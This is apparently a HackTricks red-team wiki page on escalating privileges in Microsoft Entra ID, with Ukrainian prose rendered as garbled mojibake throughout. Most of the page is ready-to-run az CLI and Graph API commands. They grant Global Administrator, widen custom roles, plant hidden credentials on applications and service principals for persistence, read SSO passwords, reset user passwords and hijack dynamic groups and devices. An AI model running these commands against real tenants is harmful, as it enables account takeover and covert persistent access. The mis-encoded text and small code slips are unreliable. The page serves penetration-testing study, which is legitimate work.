# Az - EntraID Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–Ω–µ –≤—Å—ñ –¥–µ—Ç–∞–ª—å–Ω—ñ –¥–æ–∑–≤–æ–ª–∏** –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö —Ä–æ–ª–µ–π –≤ Entra ID **–º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö —Ä–æ–ª—è—Ö.**
{% endhint %}

## Roles

### Role: Privileged Role Administrator <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

–¶—è —Ä–æ–ª—å –º—ñ—Å—Ç–∏—Ç—å –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –¥–µ—Ç–∞–ª—å–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –ø—Ä–∏–∑–Ω–∞—á–∞—Ç–∏ —Ä–æ–ª—ñ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞–º —ñ –Ω–∞–¥–∞–≤–∞—Ç–∏ –±—ñ–ª—å—à–µ –¥–æ–∑–≤–æ–ª—ñ–≤ —Ä–æ–ª—è–º. –û–±–∏–¥–≤—ñ –¥—ñ—ó –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–ª–æ–≤–∂–∏–≤–∞–Ω—ñ –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.

* –ü—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* –î–æ–¥–∞—Ç–∏ –±—ñ–ª—å—à–µ –¥–æ–∑–≤–æ–ª—ñ–≤ –¥–æ —Ä–æ–ª—ñ:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Applications

### `microsoft.directory/applications/credentials/update`

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É **–¥–æ–¥–∞–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ** (–ø–∞—Ä–æ–ª—ñ –∞–±–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∏) –¥–æ —ñ—Å–Ω—É—é—á–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤. –Ø–∫—â–æ –¥–æ–¥–∞—Ç–æ–∫ –º–∞—î –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥–æ–∑–≤–æ–ª–∏, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏—Å—è —è–∫ —Ü–µ–π –¥–æ–¥–∞—Ç–æ–∫ —ñ –æ—Ç—Ä–∏–º–∞—Ç–∏ —Ü—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —Ç—ñ –∂ –¥—ñ—ó, —â–æ –π `applications/credentials/update`, –∞–ª–µ –æ–±–º–µ–∂–µ–Ω–æ –¥–æ –æ–¥–Ω–æ–¥–∏—Ä–µ–∫—Ç–æ—Ä–Ω–∏—Ö –∑–∞—Å—Ç–æ—Å—É–Ω–∫—ñ–≤.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**–û–ø–∏—Å**: –û–Ω–æ–≤–ª–µ–Ω–Ω—è –≤–ª–∞—Å–Ω–∏–∫—ñ–≤ –¥–æ–¥–∞—Ç–∫—ñ–≤\
**–ü–æ—Ç–µ–Ω—Ü—ñ–∞–ª –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è**: –î–æ–¥–∞–≤—à–∏ —Å–µ–±–µ —è–∫ –≤–ª–∞—Å–Ω–∏–∫–∞, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–º, –≤–∫–ª—é—á–∞—é—á–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –¥–æ–¥–∞–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ —ñ—Å–Ω—É—é—á–∏—Ö —Å–ª—É–∂–±–æ–≤–∏—Ö –ø—Ä–∏–Ω—Ü–∏–ø—ñ–≤. –Ø–∫—â–æ —Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø –º–∞—î –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø—Ä–∏–π–Ω—è—Ç–∏ —Ü—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
–ù–æ–≤–∏–π –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å –Ω–µ –∑'—è–≤–∏—Ç—å—Å—è –≤ –≤–µ–±-–∫–æ–Ω—Å–æ–ª—ñ, —Ç–æ–º—É —Ü–µ –º–æ–∂–µ –±—É—Ç–∏ –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–π —Å–ø–æ—Å—ñ–± –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ—Å—Ç—ñ–π–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É.\
–ó API —ó—Ö –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

–Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ –ø–æ–º–∏–ª–∫—É `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."`, —Ü–µ —Ç–æ–º—É, —â–æ **–Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å passwordCredentials** —Å–µ—Ä–≤—ñ—Å–Ω–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª—É, —ñ —Å–ø–æ—á–∞—Ç–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –π–æ–≥–æ —Ä–æ–∑–±–ª–æ–∫—É–≤–∞—Ç–∏. –î–ª—è —Ü—å–æ–≥–æ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–∞ –¥–æ–∑–≤—ñ–ª (`microsoft.directory/applications/allProperties/update`), —è–∫–∏–π –¥–æ–∑–≤–æ–ª—è—î –≤–∞–º –≤–∏–∫–æ–Ω–∞—Ç–∏:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

–¶–µ –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –¥–æ–¥–∞–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–æ —ñ—Å–Ω—É—é—á–∏—Ö —Å–ª—É–∂–±–æ–≤–∏—Ö –ø—Ä–∏–Ω—Ü–∏–ø—ñ–≤. –Ø–∫—â–æ —Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø –º–∞—î –ø—ñ–¥–≤–∏—â–µ–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø—Ä–∏–π–Ω—è—Ç–∏ —Ü—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

–°—Ö–æ–∂–µ –Ω–∞ –¥–æ–¥–∞—Ç–∫–∏, –≤–æ–ª–æ–¥—ñ–Ω–Ω—è —Å–ª—É–∂–±–æ–≤–∏–º –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–æ–º –¥–æ–∑–≤–æ–ª—è—î –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –π–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
–ü—ñ—Å–ª—è –¥–æ–¥–∞–≤–∞–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –≤–ª–∞—Å–Ω–∏–∫–∞ —è —Å–ø—Ä–æ–±—É–≤–∞–≤ –π–æ–≥–æ –≤–∏–¥–∞–ª–∏—Ç–∏, –∞–ª–µ API –≤—ñ–¥–ø–æ–≤—ñ–≤, —â–æ –º–µ—Ç–æ–¥ DELETE –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ü–µ –º–µ—Ç–æ–¥, —è–∫–∏–π –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è –≤–ª–∞—Å–Ω–∏–∫–∞. –¢–æ–∂ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ –≤–∏–¥–∞–ª–∏—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫—ñ–≤ –≤ –¥–∞–Ω–∏–π —á–∞—Å**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` —Ç–∞ `enable`

–¶—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –≤–∏–º–∫–Ω—É—Ç–∏ —Ç–∞ —É–≤—ñ–º–∫–Ω—É—Ç–∏ —Å–ª—É–∂–±–æ–≤—ñ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∏. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ–π –¥–æ–∑–≤—ñ–ª, —â–æ–± —É–≤—ñ–º–∫–Ω—É—Ç–∏ —Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª, –¥–æ —è–∫–æ–≥–æ –≤—ñ–Ω –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º, —â–æ–± –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –¥–ª—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –∑–Ω–∞–¥–æ–±–ª—è—Ç—å—Å—è –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏, —â–æ–± –∑–∞—Ö–æ–ø–∏—Ç–∏ —É–≤—ñ–º–∫–Ω–µ–Ω–∏–π —Å–ª—É–∂–±–æ–≤–∏–π –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

–¶—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ç–∞ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è —î–¥–∏–Ω–æ–≥–æ –≤—Ö–æ–¥—É, —â–æ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## –ì—Ä—É–ø–∏

### `microsoft.directory/groups/allProperties/update`

–¶—è –¥–æ–∑–≤–æ–ª—è—î –¥–æ–¥–∞–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –≥—Ä—É–ø, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –¶—è –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–ª—é—á–∞—î –≥—Ä—É–ø–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ —Ä–æ–ª—è–º Entra ID.

### `microsoft.directory/groups/owners/update`

–¶–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î —Å—Ç–∞—Ç–∏ –≤–ª–∞—Å–Ω–∏–∫–æ–º –≥—Ä—É–ø. –í–ª–∞—Å–Ω–∏–∫ –≥—Ä—É–ø–∏ –º–æ–∂–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —á–ª–µ–Ω—Å—Ç–≤–æ –≤ –≥—Ä—É–ø—ñ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ –≥—Ä—É–ø—ñ.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –≤–∏–∫–ª—é—á–∞—î –≥—Ä—É–ø–∏, –¥–æ —è–∫–∏—Ö –º–æ–∂–Ω–∞ –ø—Ä–∏–∑–Ω–∞—á–∏—Ç–∏ —Ä–æ–ª—ñ Entra ID.

### `microsoft.directory/groups/members/update`

–¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –¥–æ–∑–≤–æ–ª—è—î –¥–æ–¥–∞–≤–∞—Ç–∏ —É—á–∞—Å–Ω–∏–∫—ñ–≤ –¥–æ –≥—Ä—É–ø–∏. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –¥–æ–¥–∞—Ç–∏ —Å–µ–±–µ –∞–±–æ —à–∫—ñ–¥–ª–∏–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –∑–∞–ø–∏—Å–∏ –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –≥—Ä—É–ø, —â–æ –º–æ–∂–µ –Ω–∞–¥–∞—Ç–∏ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–π –¥–æ—Å—Ç—É–ø.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

–¶–µ–π –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏ –ø—Ä–∞–≤–∏–ª–æ —á–ª–µ–Ω—Å—Ç–≤–∞ –≤ –¥–∏–Ω–∞–º—ñ—á–Ω—ñ–π –≥—Ä—É–ø—ñ. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω—ñ –ø—Ä–∞–≤–∏–ª–∞, —â–æ–± –≤–∫–ª—é—á–∏—Ç–∏ —Å–µ–±–µ –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –≥—Ä—É–ø –±–µ–∑ —è–≤–Ω–æ–≥–æ –¥–æ–¥–∞–≤–∞–Ω–Ω—è.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**–ü—Ä–∏–º—ñ—Ç–∫–∞**: –¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –≤–∏–∫–ª—é—á–∞—î –≥—Ä—É–ø–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω—ñ —Ä–æ–ª—è–º Entra ID.

### –ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –¥–∏–Ω–∞–º—ñ—á–Ω–∏—Ö –≥—Ä—É–ø

–ú–æ–∂–ª–∏–≤–æ, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –º–æ–∂—É—Ç—å –ø—ñ–¥–≤–∏—â–∏—Ç–∏ —Å–≤–æ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó, –∑–º—ñ–Ω—é—é—á–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, —â–æ–± –±—É—Ç–∏ –¥–æ–¥–∞–Ω–∏–º–∏ —è–∫ —á–ª–µ–Ω–∏ –¥–∏–Ω–∞–º—ñ—á–Ω–∏—Ö –≥—Ä—É–ø. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–∏–≤—ñ—Ç—å—Å—è:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## –ö–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ

### `microsoft.directory/users/password/update`

–¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –¥–æ–∑–≤–æ–ª—è—î —Å–∫–∏–Ω—É—Ç–∏ –ø–∞—Ä–æ–ª—å –¥–ª—è –Ω–µ–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä—ñ–≤, —â–æ –¥–æ–∑–≤–æ–ª—è—î –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ–º—É –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

–¶—è –ø—Ä–∏–≤—ñ–ª–µ–≥—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –ó–∞–∑–≤–∏—á–∞–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –¥–∏–Ω–∞–º—ñ—á–Ω—ñ –≥—Ä—É–ø–∏, —è–∫—ñ –¥–æ–¥–∞—é—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ –æ—Å–Ω–æ–≤—ñ –∑–Ω–∞—á–µ–Ω—å –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π, —Ç–æ–º—É —Ü—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –ø–æ—Ç—Ä—ñ–±–Ω–µ –∑–Ω–∞—á–µ–Ω–Ω—è –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ, —â–æ–± —Å—Ç–∞—Ç–∏ —á–ª–µ–Ω–æ–º –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –¥–∏–Ω–∞–º—ñ—á–Ω–æ—ó –≥—Ä—É–ø–∏ —Ç–∞ –ø—ñ–¥–≤–∏—â–∏—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## –ü–æ–ª—ñ—Ç–∏–∫–∏ —É–º–æ–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É —Ç–∞ –æ–±—Ö—ñ–¥ MFA

–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –ø–æ–ª—ñ—Ç–∏–∫–∏ —É–º–æ–≤–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É, —â–æ –≤–∏–º–∞–≥–∞—é—Ç—å MFA, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω—ñ, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## –ü—Ä–∏—Å—Ç—Ä–æ—ó

### `microsoft.directory/devices/registeredOwners/update`

–¶—è –¥–æ–∑–≤–æ–ª–µ–Ω–∞ –¥—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –ø—Ä–∏–∑–Ω–∞—á–∞—Ç–∏ —Å–µ–±–µ –≤–ª–∞—Å–Ω–∏–∫–∞–º–∏ –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å –∞–±–æ –¥–æ—Å—Ç—É–ø –¥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å —ñ –¥–∞–Ω–∏—Ö, —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏—Ö –¥–ª—è –ø—Ä–∏—Å—Ç—Ä–æ—ó–≤.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

–¶—è –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –∞—Å–æ—Ü—ñ—é–≤–∞—Ç–∏ —Å–≤—ñ–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∑ –ø—Ä–∏—Å—Ç—Ä–æ—è–º–∏, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∞–±–æ –æ–±—ñ–π—Ç–∏ –ø–æ–ª—ñ—Ç–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

